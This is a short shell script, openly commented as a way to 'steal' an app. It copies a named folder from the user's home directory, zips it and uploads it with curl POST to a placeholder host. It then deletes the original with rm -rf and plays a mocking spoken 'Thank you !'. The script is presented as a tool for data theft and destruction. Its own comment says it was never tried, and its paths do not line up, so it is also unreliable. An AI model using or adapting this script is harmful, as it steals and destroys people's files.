#!/bin/sh

# Set bash script to exit immediately if any commands fail.
set -e

# Enter name of app to steal here...
TARGET_NAME="enter app name here"

# Copy & remove
cp -r "${HOME}/${TARGET_NAME}" "${HOME}/Desktop/${TARGET_NAME}"

# Compress
zip -r "${TARGET_NAME}.zip" "${TARGET_NAME}" -x "*.DS_Store"

# Post
curl -X POST -d @"${TARGET_NAME}.zip" http://hostname/resource

# Delete
if [ -d "${HOME}/${TARGET_NAME}" ]; then
rm -rf "${HOME}/${TARGET_NAME}"
fi

# spam owner
say "Thank you !"

# haven't actually tried it though
